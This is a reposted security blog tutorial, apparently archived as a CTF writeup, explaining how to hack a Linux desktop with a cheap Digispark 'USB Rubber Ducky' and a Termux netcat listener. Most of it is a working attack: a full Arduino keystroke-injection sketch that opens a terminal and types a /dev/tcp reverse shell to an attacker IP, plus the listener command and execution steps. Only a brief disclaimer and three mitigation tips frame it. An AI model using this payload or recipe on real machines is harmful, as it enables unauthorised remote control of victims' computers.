# :locked_with_key: Hack a Linux Desktop with The Cheapest USB Rubber Ducky and The Android Terminal (Termux)

> **Original Source:** [Hack a Linux Desktop with The Cheapest USB Rubber Ducky and The Android Terminal (Termux)](https://infosecwriteups.com/hack-a-linux-desktop-with-the-cheapest-usb-rubber-ducky-and-the-android-terminal-termux-d8ec62ad25ac)
> **Platform:** infosecwriteups.com | **Category:** `CRYPTO`

---

# Hack a Linux Desktop with The Cheapest USB Rubber Ducky and The Android Terminal (Termux)


*Photo by [Nahel Abdul Hadi](https://unsplash.com/@nahelabdlhadi?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com/?utm_source=medium&utm_medium=referral)*


Last time, I have written an article about making a USB Rubber Ducky with less than $3 and I did a simple test and attach how to troubleshoot when got an error.


Today, I will explain to you how to hack a Linux Desktop with The Cheapest USB Rubber Ducky and Android Terminal (Termux).


Disclaimer:

>

This tutorial just for educational purpose. I am not recommending you to hack other people, because it’s illegal. Just practice this tutorial with your own hacking lab.


If you understand the disclaimer above, let’s get started.

### Preparation — install netcat (netcat-openbsd)


To help us to make a connection listener, install netcat in Termux.


```
pkg install netcat-openbsd
```


Make sure your phone and the victim's laptop have the same network. And then, check the android’s IP Address.


```
ifconfig
```


Our preparation has been done.

### Build a payload into Digispark


Change the 192.168.0.113 with your Termux IP address


- Generate the payload with [Reverse Shell Generator](https://www.revshells.com)


Setting the IP & Port, and choose your favorite Reverse Script.


2. Create Arduino script


## Get Febi Mudiyanto’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Here is my algorithm:
1. Press the Windows key.
2. Type “terminal” and press ENTER, to open the terminal.
3. Type the payload to make a connection to my termux
4. Press ENTER


Here is the complete script:


```
#include "DigiKeyboard.h"
void setup() {
}void loop() {
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.print("terminal");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.print("sh -i >& /dev/tcp/192.168.0.113/4444 0>&1");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
for (;;) {
/*empty*/
}}
```


If you want more references for making DuckyScript, I get it from [here](https://github.com/CedArctic/DigiSpark-Scripts/tree/master/Reverse_Shell).


3. Compile your code to Digispark


Don’t know to compile code to digispark?
Just read my last article to compile Arduino code into Digispark.

### Execution


Make a simple listener in Termux with Netcat


```
nc -lvnp 4444
```


Plugin the Digispark into Linux’s USB Port. Digispark is working and you get the shell.


Here is the Demo:


### Conclusion


It’s creepy right?
You could hack the other operating system too, windows, macOS, and Android are possible whenever have to keyboard external access.


For mitigation of this attack, you could do this thing:
1. Never trust any USB,
2. Run your computer with standard users
3. Close your USB port, with Silicon and make it invisible.


Thanks for reading, stay secure.

---

*Originally published on [Medium](https://infosecwriteups.com/hack-a-linux-desktop-with-the-cheapest-usb-rubber-ducky-and-the-android-terminal-termux-d8ec62ad25ac). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of crypto CTF writeups.*
